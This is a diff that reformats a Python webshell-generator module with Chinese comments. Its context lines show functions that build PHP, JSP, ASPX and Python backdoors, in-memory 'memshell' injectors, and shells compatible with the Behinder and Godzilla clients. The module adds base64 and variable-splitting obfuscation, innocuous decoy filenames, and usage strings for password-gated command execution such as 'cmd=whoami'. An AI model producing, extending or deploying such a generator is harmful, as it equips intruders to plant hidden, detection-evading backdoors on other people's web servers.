@@ -6,21 +6,22 @@ Webshell 管理模块 - Webshell Manager
 """
 
 import base64
+import hashlib
+import logging
+import os
 import random
 import secrets
 import string
-import hashlib
-import os
-from typing import Dict, List, Optional, Any
 from dataclasses import dataclass
 from enum import Enum
+from typing import Any, Dict, List, Optional
 
-import logging
 logger = logging.getLogger(__name__)
 
 
 class WebshellType(Enum):
     """Webshell 类型"""
+
     PHP_BASIC = "php_basic"
     PHP_EVAL = "php_eval"
     PHP_ASSERT = "php_assert"
@@ -36,6 +37,7 @@ class WebshellType(Enum):
 
 class ObfuscationLevel(Enum):
     """混淆级别"""
+
     NONE = 0
     LOW = 1
     MEDIUM = 2
@@ -45,6 +47,7 @@ class ObfuscationLevel(Enum):
 @dataclass
 class WebshellResult:
     """Webshell 生成结果"""
+
     success: bool
     shell_type: str
     content: str
@@ -72,18 +75,28 @@ class WebshellGenerator:
     """
 
     def __init__(self):
-        self._random_seed = ''.join(secrets.choice(string.ascii_letters) for _ in range(8))
+        self._random_seed = "".join(secrets.choice(string.ascii_letters) for _ in range(8))
 
     def _generate_password(self, length: int = 12) -> str:
         """生成密码学安全的随机密码"""
         charset = string.ascii_letters + string.digits
-        return ''.join(secrets.choice(charset) for _ in range(length))
+        return "".join(secrets.choice(charset) for _ in range(length))
 
     def _generate_filename(self, extension: str) -> str:
         """生成随机文件名"""
         names = [
-            "config", "settings", "cache", "temp", "log", "data",
-            "helper", "util", "common", "core", "base", "init"
+            "config",
+            "settings",
+            "cache",
+            "temp",
+            "log",
+            "data",
+            "helper",
+            "util",
+            "common",
+            "core",
+            "base",
+            "init",
         ]
         return f"{secrets.choice(names)}_{self._random_seed[:4]}.{extension}"
 
@@ -100,8 +113,8 @@ class WebshellGenerator:
         if level == ObfuscationLevel.MEDIUM:
             # 变量混淆 + Base64
             encoded = base64.b64encode(code.encode()).decode()
-            var1 = ''.join(secrets.choice(string.ascii_lowercase) for _ in range(6))
-            var2 = ''.join(secrets.choice(string.ascii_lowercase) for _ in range(6))
+            var1 = "".join(secrets.choice(string.ascii_lowercase) for _ in range(6))
+            var2 = "".join(secrets.choice(string.ascii_lowercase) for _ in range(6))
             return f"""<?php
 ${var1} = 'base'.'64_'.'decode';
 ${var2} = ${var1}('{encoded}');
@@ -112,8 +125,8 @@ eval(${var2});
             # 多层混淆
             encoded = base64.b64encode(code.encode()).decode()
             # 字符分割
-            chunks = [encoded[i:i+10] for i in range(0, len(encoded), 10)]
-            var_prefix = ''.join(secrets.choice(string.ascii_lowercase) for _ in range(3))
+            chunks = [encoded[i : i + 10] for i in range(0, len(encoded), 10)]
+            var_prefix = "".join(secrets.choice(string.ascii_lowercase) for _ in range(3))
 
             vars_def = []
             vars_concat = []
@@ -132,10 +145,12 @@ ${''.join(secrets.choice(string.ascii_lowercase) for _ in range(4))}={'.'.join(v
 
     # ==================== PHP Webshell ====================
 
-    def php_shell(self,
-                  password: str = "",
-                  shell_type: str = "basic",
-                  obfuscation: ObfuscationLevel = ObfuscationLevel.NONE) -> WebshellResult:
+    def php_shell(
+        self,
+        password: str = "",
+        shell_type: str = "basic",
+        obfuscation: ObfuscationLevel = ObfuscationLevel.NONE,
+    ) -> WebshellResult:
         """
         生成 PHP Webshell
 
@@ -197,7 +212,7 @@ if(md5($_POST['pwd'])==$p){{
         # 应用混淆
         if obfuscation != ObfuscationLevel.NONE:
             # 提取 PHP 代码内容
-            inner_code = code.replace('<?php', '').replace('?>', '').strip()
+            inner_code = code.replace("<?php", "").replace("?>", "").strip()
             code = self._obfuscate_php(inner_code, obfuscation)
 
         return WebshellResult(
@@ -207,7 +222,7 @@ if(md5($_POST['pwd'])==$p){{
             password=password,
             filename=self._generate_filename("php"),
             usage=f"POST: pwd={password}&cmd=base64_encode('system(\"whoami\");')",
-            detection_tips="使用 POST 传递密码和命令，cmd 需要 base64 编码"
+            detection_tips="使用 POST 传递密码和命令，cmd 需要 base64 编码",
         )
 
     def php_memshell(self, password: str = "") -> WebshellResult:
@@ -242,14 +257,12 @@ if(!isset($GLOBALS['__mem_shell'])) {{
             password=password,
             filename="memshell_inject.php",
             usage="通过文件包含或反序列化注入此代码",
-            detection_tips="无文件落地，存在于内存中"
+            detection_tips="无文件落地，存在于内存中",
         )
 
     # ==================== JSP Webshell ====================
 
-    def jsp_shell(self,
-                  password: str = "",
-                  shell_type: str = "basic") -> WebshellResult:
+    def jsp_shell(self, password: str = "", shell_type: str = "basic") -> WebshellResult:
         """
         生成 JSP Webshell
 
@@ -318,7 +331,7 @@ if("{password}".equals(request.getParameter("pwd"))) {{
             content=code,
             password=password,
             filename=self._generate_filename("jsp"),
-            usage=f"GET/POST: ?pwd={password}&cmd=whoami"
+            usage=f"GET/POST: ?pwd={password}&cmd=whoami",
         )
 
     def jsp_memshell_filter(self, password: str = "") -> Dict[str, str]:
@@ -394,7 +407,7 @@ if("{password}".equals(request.getParameter("pwd"))) {{
             "inject_code": inject_code,
             "password": password,
             "usage": f"访问注入页面后，任意 URL 可用: ?pwd={password}&cmd=whoami",
-            "type": "jsp_filter_memshell"
+            "type": "jsp_filter_memshell",
         }
 
     # ==================== ASPX Webshell ====================
@@ -427,7 +440,7 @@ if(pwd == "{password}" && cmd != null) {{
             content=code,
             password=password,
             filename=self._generate_filename("aspx"),
-            usage=f"GET/POST: ?pwd={password}&cmd=whoami"
+            usage=f"GET/POST: ?pwd={password}&cmd=whoami",
         )
 
     # ==================== Python Webshell ====================
@@ -472,7 +485,7 @@ def debug_shell():
             content=code,
             password=password,
             filename="debug_route.py",
-            usage=f"GET/POST: /api/debug?pwd={password}&cmd=id"
+            usage=f"GET/POST: /api/debug?pwd={password}&cmd=id",
         )
 
     # ==================== 冰蝎/哥斯拉 ====================
@@ -515,7 +528,7 @@ class C{{public function __invoke($p){{eval($p."");}}}}
             password=key,
             filename=self._generate_filename("php"),
             usage="使用冰蝎客户端连接，密钥: " + key,
-            detection_tips="兼容冰蝎 3.0+"
+            detection_tips="兼容冰蝎 3.0+",
         )
 
     def godzilla_shell(self, password: str = "", key: str = "") -> WebshellResult:
@@ -569,15 +582,14 @@ if(isset($_POST[$pass])){{
             password=password,
             filename=self._generate_filename("php"),
             usage=f"使用哥斯拉客户端连接，密码: {password}, 密钥: {key}",
-            detection_tips="兼容哥斯拉 4.0+"
+            detection_tips="兼容哥斯拉 4.0+",
         )
 
 
 # 便捷函数
-def generate_webshell(shell_type: str = "php",
-                      password: str = "",
-                      obfuscation: str = "none",
-                      **kwargs) -> Dict[str, Any]:
+def generate_webshell(
+    shell_type: str = "php", password: str = "", obfuscation: str = "none", **kwargs
+) -> Dict[str, Any]:
     """
     生成 Webshell
 
@@ -593,7 +605,7 @@ def generate_webshell(shell_type: str = "php",
         "none": ObfuscationLevel.NONE,
         "low": ObfuscationLevel.LOW,
         "medium": ObfuscationLevel.MEDIUM,
-        "high": ObfuscationLevel.HIGH
+        "high": ObfuscationLevel.HIGH,
     }
     obf_level = obf_map.get(obfuscation, ObfuscationLevel.NONE)
 
@@ -621,7 +633,7 @@ def generate_webshell(shell_type: str = "php",
         "password": result.password,
         "filename": result.filename,
         "usage": result.usage,
-        "detection_tips": result.detection_tips
+        "detection_tips": result.detection_tips,
     }
 
 
@@ -640,7 +652,7 @@ def list_webshell_types() -> List[Dict[str, str]]:
 
 if __name__ == "__main__":
     # 配置测试用日志
-    logging.basicConfig(level=logging.INFO, format='%(levelname)s: %(message)s')
+    logging.basicConfig(level=logging.INFO, format="%(levelname)s: %(message)s")
 
     logger.info("Webshell Generator Module")
     logger.info("=" * 50)
